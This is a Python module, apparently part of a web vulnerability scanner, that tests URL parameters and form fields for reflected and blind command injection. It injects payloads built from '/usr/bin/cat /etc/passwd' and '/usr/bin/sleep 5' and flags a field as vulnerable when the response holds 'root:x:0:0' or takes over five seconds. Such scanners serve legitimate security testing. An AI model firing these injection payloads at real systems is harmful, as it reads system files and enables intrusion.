from .tools import getPaylods
from utils.exploitloop import exploitLoop
from log import impr, bold, red, warn, info

###########################################################################
###########################################################################

def checkResponseFunction(res):
  return "root:x:0:0" in res.text or res.elapsed.total_seconds() > 5

###########################################################################
###########################################################################

def foundExploitCallback(res, kind):
  if kind == "url":
    impr(
      f"In the url {res.urlWithPayload} the {res.kind} "
      f"param `{bold(res.getParamName())}` {red(bold('is vulnerable'))}"
    )
  else:
    impr(
      f"In the url {res.form.url} the form {res.form.method} {res.form.action} "
      f"field `{bold(res.field)}` {red(bold('is vulnerable'))} with payload {bold(res.payload)}"
    )

###########################################################################
###########################################################################

def cmdInjectionModule(urls, forms, cookies):  
  info(bold("Testing for Reflected Command Injection"))
  payloads = getPaylods("/usr/bin/cat /etc/passwd")
  reflectedResults = exploitLoop(urls, forms, cookies, payloads, checkResponseFunction, foundExploitCallback)

  if len(reflectedResults) == 0:
    warn("No reflected Command Injection found")
  
  print()

  info(bold("Testing for Blind Command Injection"))
  payloads = getPaylods("/usr/bin/sleep 5")
  blindResults = exploitLoop(urls, forms, cookies, payloads, checkResponseFunction, foundExploitCallback)

  if len(blindResults) == 0:
    warn("No blind Command Injection found")

  return reflectedResults, blindResults
